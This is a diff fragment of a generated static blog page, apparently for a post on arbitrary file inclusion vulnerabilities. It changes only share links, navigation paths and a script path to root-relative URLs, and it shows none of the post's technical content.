+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&name=任意文件包含漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&t=任意文件包含漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -428,19 +428,19 @@ shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><p
     <nav>
       <ul>
          
-          <li><a href="/PuTa0T/puta0t.github.io/">Home</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/about/">About</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/archives/">Writing</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/categories/">Categories</a></li>
+          <li><a href="/categories/">Categories</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/tags/">Tags</a></li>
+          <li><a href="/tags/">Tags</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/search/">Search</a></li>
+          <li><a href="/search/">Search</a></li>
          
-          <li><a href="https://github.com/PuTa0T">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/PuTa0T">Projects</a></li>
         
       </ul>
     </nav>
@@ -488,7 +488,7 @@ shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><p
   </script>
 
 
-<script src="/PuTa0T/puta0t.github.io/js/main.js"></script>
+<script src="/js/main.js"></script>
 
 <!-- search -->
 
